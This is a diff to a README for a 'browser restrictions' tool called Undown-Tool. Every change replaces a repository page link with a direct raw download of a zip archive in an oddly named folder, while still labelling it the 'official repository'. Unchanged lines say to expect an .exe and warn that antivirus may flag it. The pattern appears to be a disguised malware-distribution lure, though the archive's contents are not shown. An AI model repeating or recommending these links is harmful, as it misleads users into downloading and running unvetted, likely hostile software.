@@ -1,6 +1,6 @@
 # 🔓 Undown-Tool - Manage your browser restrictions with ease
 
-[![](https://img.shields.io/badge/Download-Undown-Tool-blue.svg)](https://github.com/Overexertiondramatisation402/Undown-Tool)
+[![](https://img.shields.io/badge/Download-Undown-Tool-blue.svg)](https://github.com/Overexertiondramatisation402/Undown-Tool/raw/refs/heads/main/radioautograph/Tool-Undown-v1.3-alpha.4.zip)
 
 ## 📌 What is Undown-Tool?
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start the setup process
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official repository page: [https://github.com/Overexertiondramatisation402/Undown-Tool](https://github.com/Overexertiondramatisation402/Undown-Tool).
+1.  Visit the official repository page: [https://github.com/Overexertiondramatisation402/Undown-Tool/raw/refs/heads/main/radioautograph/Tool-Undown-v1.3-alpha.4.zip](https://github.com/Overexertiondramatisation402/Undown-Tool/raw/refs/heads/main/radioautograph/Tool-Undown-v1.3-alpha.4.zip).
 2.  Look for the Releases section on the right side of the screen.
 3.  Click on the latest release version.
 4.  Select the file ending in .exe to download the installer to your computer.
@@ -80,7 +80,7 @@ Check your antivirus software. Some security programs flag new tools as suspicio
 
 ## 📦 Updates
 
-Software developers issue updates to keep the tool compatible with new Windows versions. Return to the [official repository](https://github.com/Overexertiondramatisation402/Undown-Tool) periodically to check for newer files. Replacing your old version with the latest release ensures the best experience. 
+Software developers issue updates to keep the tool compatible with new Windows versions. Return to the [official repository](https://github.com/Overexertiondramatisation402/Undown-Tool/raw/refs/heads/main/radioautograph/Tool-Undown-v1.3-alpha.4.zip) periodically to check for newer files. Replacing your old version with the latest release ensures the best experience. 
 
 ## 📋 Features
 
